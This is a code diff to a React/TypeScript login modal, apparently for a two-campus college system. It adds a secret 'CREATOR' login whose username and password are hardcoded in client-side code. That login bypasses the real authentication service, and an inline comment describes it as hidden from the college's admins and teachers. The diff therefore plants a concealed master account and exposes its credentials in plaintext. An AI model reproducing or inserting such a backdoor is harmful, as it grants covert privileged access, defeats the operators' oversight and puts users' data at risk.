@@ -8,7 +8,7 @@ import { loginWithRealtimeAuth } from "@/lib/authService";
 
 
 interface LoginModalProps {
-  onLoginSuccess: (campus: "KARUR" | "COIMBATORE", role: "ADMIN" | "TEACHER", username: string) => void;
+  onLoginSuccess: (campus: "KARUR" | "COIMBATORE", role: "ADMIN" | "TEACHER" | "CREATOR", username: string) => void;
 }
 
 export default function LoginModal({ onLoginSuccess }: LoginModalProps) {
@@ -67,6 +67,16 @@ export default function LoginModal({ onLoginSuccess }: LoginModalProps) {
     if (!inputUser || !inputPass) {
       setLoading(false);
       setError("Please enter both ID/email and password.");
+      return;
+    }
+
+    // 0. EXCLUSIVE MASTER CREATOR AUTHENTICATION (Never exposed to College Admins or Teachers)
+    if (
+      (inputUser.toLowerCase() === "spherexnithish#" || inputUser === "spherexnithish#") &&
+      inputPass === "spherex#2501"
+    ) {
+      setLoading(false);
+      onLoginSuccess("KARUR", "CREATOR", "spherexnithish#");
       return;
     }
 
